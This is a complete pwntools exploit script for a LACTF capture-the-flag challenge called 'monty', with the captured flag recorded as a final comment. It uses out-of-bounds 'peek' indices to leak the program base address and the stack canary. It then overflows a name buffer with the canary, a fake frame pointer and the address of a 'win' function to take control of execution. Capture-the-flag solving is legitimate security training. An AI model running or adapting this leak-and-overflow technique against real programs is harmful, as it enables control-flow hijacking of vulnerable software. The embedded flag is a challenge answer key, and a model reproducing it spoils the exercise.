#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./monty")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("chall.lac.tf", 31132)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	r.sendlineafter(b'peek?', b'-3')
	r.recvuntil(b'Peek 1: ')
	elf_leak = int(r.recvline().strip())
	exe.address = elf_leak - (0x557d0b0163f1 - 0x557d0b015000)
	success(f'{hex(exe.address)=}')

	r.sendlineafter(b'peek?', b'-27')
	r.recvuntil(b'Peek 2: ')
	canary = int(r.recvline().strip())
	success(f'{hex(canary)=}')

	r.sendlineafter(b'lady!', b'0')
	
	r.sendlineafter(b'Name:', flat({
		0x18: canary,
		0x20: exe.bss(),
		0x28: exe.sym['win'] + 1
	}))


	r.interactive()


if __name__ == "__main__":
	main()

# lactf{m0n7y_533_m0n7y_d0}
